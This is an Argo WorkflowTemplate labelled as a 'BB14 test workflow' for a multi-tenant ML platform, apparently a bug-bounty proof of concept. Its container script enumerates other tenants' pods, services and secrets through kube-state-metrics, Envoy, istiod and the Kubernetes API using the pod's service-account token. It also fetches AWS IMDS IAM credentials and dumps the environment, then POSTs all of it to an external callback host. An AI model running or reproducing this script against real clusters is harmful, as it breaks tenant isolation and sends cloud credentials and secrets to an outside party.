apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-exec
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-exec"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-exec"
    ai.sap.com/version: "10.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - sh
      - -c
      - |
        CB="https://www.masonhck.tech/cb.php"
        post() { curl -k -s -X POST "${CB}?src=$1" --max-time 10 -d @- ; }
        get() { curl -k -s "${CB}?src=$1" --max-time 5 ; }

        get "esc1-start-$(hostname)-$(date +%s)"

        # ============================================================
        # EVIDENCE 1: CROSS-TENANT POD ENUMERATION VIA KSM
        # Proves tenant isolation broken - see OTHER tenants' pods
        # ============================================================
        curl -s --connect-timeout 10 "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" > /tmp/ksm_pods.txt 2>&1
        echo "ksm_pods_bytes=$(wc -c < /tmp/ksm_pods.txt)" | post "esc1-ksm-pods-size"

        # ALL unique namespaces visible (cross-tenant proof)
        grep -oE 'namespace="[^"]*"' /tmp/ksm_pods.txt | sort -u | post "esc1-ksm-all-namespaces"

        # Pod count per namespace
        grep "kube_pod_info{" /tmp/ksm_pods.txt | grep -oE 'namespace="[^"]*"' | sort | uniq -c | sort -rn | post "esc1-ksm-pods-per-namespace"

        # Our namespace
        MY_NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "unknown")
        echo "my_namespace=${MY_NS}" | post "esc1-my-namespace"

        # OTHER TENANTS' pods
        grep "kube_pod_info{" /tmp/ksm_pods.txt | grep -v "namespace=\"${MY_NS}\"" | head -30 | post "esc1-ksm-other-tenant-pods-1"
        grep "kube_pod_info{" /tmp/ksm_pods.txt | grep -v "namespace=\"${MY_NS}\"" | sed -n '30,60p' | post "esc1-ksm-other-tenant-pods-2"
        grep "kube_pod_info{" /tmp/ksm_pods.txt | grep -v "namespace=\"${MY_NS}\"" | sed -n '60,90p' | post "esc1-ksm-other-tenant-pods-3"

        # Pod images across namespaces
        grep -oE 'image="[^"]*"' /tmp/ksm_pods.txt | sort -u | post "esc1-ksm-all-images"

        # Secrets visible
        grep "kube_secret_info\|kube_secret_metadata" /tmp/ksm_pods.txt | head -40 | post "esc1-ksm-secrets"

        # Node info
        grep "kube_node_info" /tmp/ksm_pods.txt | head -10 | post "esc1-ksm-node-info"

        # CronJobs (cross-tenant)
        grep "kube_cronjob_" /tmp/ksm_pods.txt | head -30 | post "esc1-ksm-cronjobs"

        # Custom KSM
        curl -s --connect-timeout 10 "http://ksm-custom-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" > /tmp/ksm_custom.txt 2>&1
        wc -c < /tmp/ksm_custom.txt | post "esc1-ksm-custom-size"
        grep -oE 'namespace="[^"]*"' /tmp/ksm_custom.txt | sort -u | post "esc1-ksm-custom-namespaces"

        # Multi KSM
        curl -s --connect-timeout 10 "http://ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" > /tmp/ksm_multi.txt 2>&1
        wc -c < /tmp/ksm_multi.txt | post "esc1-ksm-multi-size"
        grep -oE 'namespace="[^"]*"' /tmp/ksm_multi.txt | sort -u | post "esc1-ksm-multi-namespaces"
        grep "kube_pod_info\|kube_secret\|kube_configmap" /tmp/ksm_multi.txt | head -40 | post "esc1-ksm-multi-resources"

        # ============================================================
        # EVIDENCE 2: ENVOY SERVICE MESH - FULL CLUSTER TOPOLOGY
        # ============================================================
        curl -s localhost:15000/clusters > /tmp/envoy_clusters.txt 2>&1
        echo "envoy_clusters_bytes=$(wc -c < /tmp/envoy_clusters.txt)" | post "esc1-envoy-clusters-size"

        # All services across ALL namespaces
        grep -oE '[a-z0-9-]+\.[a-z0-9-]+\.svc\.cluster\.local' /tmp/envoy_clusters.txt | sort -u | post "esc1-envoy-all-services"

        # Namespaces from Envoy
        grep -oE '[a-z0-9-]+\.[a-z0-9-]+\.svc\.cluster\.local' /tmp/envoy_clusters.txt | sed 's/[^.]*\.\([^.]*\)\..*/\1/' | sort -u | post "esc1-envoy-namespaces"

        # Envoy config dump
        curl -s localhost:15000/config_dump > /tmp/envoy_config.txt 2>&1
        wc -c < /tmp/envoy_config.txt | post "esc1-envoy-config-size"

        # Extract routes
        python3 -c "
        import json
        with open('/tmp/envoy_config.txt') as f:
            data = json.load(f)
        for c in data.get('configs',[]):
            if 'dynamic_listeners' in c:
                for l in c['dynamic_listeners'][:10]:
                    print('listener:', l.get('name','?'))
            if 'dynamic_route_configs' in c:
                for r in c['dynamic_route_configs'][:10]:
                    rc = r.get('route_config',{})
                    for vh in rc.get('virtual_hosts',[])[:20]:
                        print(f'route: {vh.get(\"name\",\"?\")}: domains={vh.get(\"domains\",[])[:3]}')
        " 2>&1 | post "esc1-envoy-routes"

        curl -s localhost:15000/server_info 2>&1 | head -c 1500 | post "esc1-envoy-server-info"
        curl -s localhost:15000/listeners 2>&1 | head -c 1500 | post "esc1-envoy-listeners"

        # ============================================================
        # EVIDENCE 3: KUBERNETES API & SERVICE ACCOUNT PERMISSIONS
        # ============================================================
        SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
        echo "sa_token_length=${#SA_TOKEN}" | post "esc1-sa-token-length"

        if [ -n "$SA_TOKEN" ]; then
          echo "$SA_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null | post "esc1-sa-token-claims"

          K8S="https://kubernetes.default.svc"
          AUTH="Authorization: Bearer ${SA_TOKEN}"

          # List pods in our namespace
          curl -sk "${K8S}/api/v1/namespaces/${MY_NS}/pods" -H "${AUTH}" 2>&1 | head -c 3000 | post "esc1-k8s-our-pods"

          # List ALL pods (cross-tenant)
          curl -sk "${K8S}/api/v1/pods" -H "${AUTH}" 2>&1 | head -c 3000 | post "esc1-k8s-all-pods"

          # List namespaces
          curl -sk "${K8S}/api/v1/namespaces" -H "${AUTH}" 2>&1 | head -c 3000 | post "esc1-k8s-namespaces"

          # Secrets in our namespace
          curl -sk "${K8S}/api/v1/namespaces/${MY_NS}/secrets" -H "${AUTH}" 2>&1 | head -c 3000 | post "esc1-k8s-our-secrets"

          # ALL secrets
          curl -sk "${K8S}/api/v1/secrets" -H "${AUTH}" 2>&1 | head -c 3000 | post "esc1-k8s-all-secrets"

          # RBAC self-check
          curl -sk "${K8S}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
            -H "${AUTH}" -H "Content-Type: application/json" \
            -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"${MY_NS}\"}}" 2>&1 | head -c 3000 | post "esc1-k8s-rbac"

          # Cluster version
          curl -sk "${K8S}/version" -H "${AUTH}" 2>&1 | post "esc1-k8s-version"

          # Try other tenant namespaces
          for ns in istio-system kube-system opentelemetry dynatrace; do
            curl -sk "${K8S}/api/v1/namespaces/${ns}/pods" -H "${AUTH}" 2>&1 | head -c 2000 | post "esc1-k8s-${ns}-pods"
          done
        fi

        # ============================================================
        # EVIDENCE 4: ISTIOD CONTROL PLANE
        # ============================================================
        ISTIOD_IP=$(dig +short istiod.istio-system.svc.cluster.local @100.104.0.10 2>/dev/null | head -1)
        echo "istiod_ip=${ISTIOD_IP}" | post "esc1-istiod-ip"

        if [ -n "$ISTIOD_IP" ]; then
          for ep in configz endpointz registryz syncz authorizationz; do
            curl -s --connect-timeout 5 "http://${ISTIOD_IP}:15014/debug/${ep}" 2>&1 | head -c 3000 | post "esc1-istiod-${ep}"
          done
          curl -s --connect-timeout 5 "http://${ISTIOD_IP}:15014/metrics" 2>&1 | grep -i "pilot\|mesh\|proxy" | head -30 | post "esc1-istiod-metrics"
        fi

        # ============================================================
        # EVIDENCE 5: MONGODB / MLFLOW / INTERNAL SERVICES
        # ============================================================
        MONGO_IP=$(dig +short "mongodb.ml-tracking.svc.cluster.local" @100.104.0.10 2>/dev/null | head -1)
        echo "mongodb_ip=${MONGO_IP}" | post "esc1-mongodb-ip"
        if [ -n "$MONGO_IP" ]; then
          echo "" | timeout 5 ncat ${MONGO_IP} 27017 2>&1 | xxd | head -20 | post "esc1-mongodb-banner"
        fi

        MLFLOW_IP=$(dig +short "mlflow.ml-tracking.svc.cluster.local" @100.104.0.10 2>/dev/null | head -1)
        echo "mlflow_ip=${MLFLOW_IP}" | post "esc1-mlflow-ip"
        if [ -n "$MLFLOW_IP" ]; then
          curl -s --connect-timeout 5 "http://${MLFLOW_IP}:5000/api/2.0/mlflow/experiments/list" 2>&1 | head -c 2000 | post "esc1-mlflow-experiments"
          curl -s --connect-timeout 5 "http://${MLFLOW_IP}:5000/api/2.0/mlflow/registered-models/list" 2>&1 | head -c 2000 | post "esc1-mlflow-models"
        fi

        TILLER_IP=$(dig +short "tiller-deploy.kube-system.svc.cluster.local" @100.104.0.10 2>/dev/null | head -1)
        echo "tiller_ip=${TILLER_IP}" | post "esc1-tiller-ip"
        if [ -n "$TILLER_IP" ]; then
          echo "" | timeout 5 ncat ${TILLER_IP} 44134 2>&1 | xxd | head -20 | post "esc1-tiller-banner"
        fi

        # ============================================================
        # EVIDENCE 6: OTEL COLLECTORS (cross-tenant metrics)
        # ============================================================
        for svc in otel-collector otel-collector-opentelemetry-collector opentelemetry-collector; do
          OTEL_IP=$(dig +short "${svc}.opentelemetry.svc.cluster.local" @100.104.0.10 2>/dev/null | head -1)
          if [ -n "$OTEL_IP" ]; then
            echo "${svc}=${OTEL_IP}" | post "esc1-otel-${svc}-ip"
            curl -s --connect-timeout 5 "http://${OTEL_IP}:8888/metrics" 2>&1 | head -c 2000 | post "esc1-otel-${svc}-metrics"
          fi
        done

        # ============================================================
        # EVIDENCE 7: AWS IMDS
        # ============================================================
        TOKEN_IMDS=$(curl -s --connect-timeout 3 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>&1)
        if [ ${#TOKEN_IMDS} -gt 10 ]; then
          echo "imds_v2_available=true" | post "esc1-imds-v2"
          curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -H "X-aws-ec2-metadata-token: ${TOKEN_IMDS}" 2>&1 | post "esc1-imds-iam-roles"
          ROLE=$(curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -H "X-aws-ec2-metadata-token: ${TOKEN_IMDS}" 2>&1 | head -1)
          if [ -n "$ROLE" ] && [ "$ROLE" != "<?xml"* ]; then
            curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}" -H "X-aws-ec2-metadata-token: ${TOKEN_IMDS}" 2>&1 | post "esc1-imds-iam-creds"
          fi
          curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/iam/info" -H "X-aws-ec2-metadata-token: ${TOKEN_IMDS}" 2>&1 | post "esc1-imds-iam-info"
          curl -s --connect-timeout 3 "http://169.254.169.254/latest/dynamic/instance-identity/document" -H "X-aws-ec2-metadata-token: ${TOKEN_IMDS}" 2>&1 | post "esc1-imds-instance-doc"
        else
          # Try IMDSv1
          curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/" 2>&1 | head -c 500 | post "esc1-imds-v1"
        fi

        # ============================================================
        # EVIDENCE 8: NETWORK + ENVIRONMENT
        # ============================================================
        curl -s --connect-timeout 5 "http://ifconfig.me" 2>&1 | post "esc1-egress-ip"
        env | sort | post "esc1-env-all"
        cat /etc/resolv.conf 2>&1 | post "esc1-resolv-conf"
        ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1 | post "esc1-sa-dir"
        cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>&1 | post "esc1-sa-namespace"

        # Mounted volumes
        mount | post "esc1-mounts"
        df -h | post "esc1-disk"

        # Process list (see what else runs in the pod)
        ps aux 2>&1 | post "esc1-processes"

        # Network interfaces and routing
        ip addr 2>&1 | post "esc1-ip-addr"
        ip route 2>&1 | post "esc1-ip-route"
        cat /etc/hosts 2>&1 | post "esc1-hosts"

        get "esc1-complete-$(hostname)-$(date +%s)"
      resources:
        limits:
          cpu: "2"
          memory: "2Gi"
        requests:
          cpu: "500m"
          memory: "512Mi"
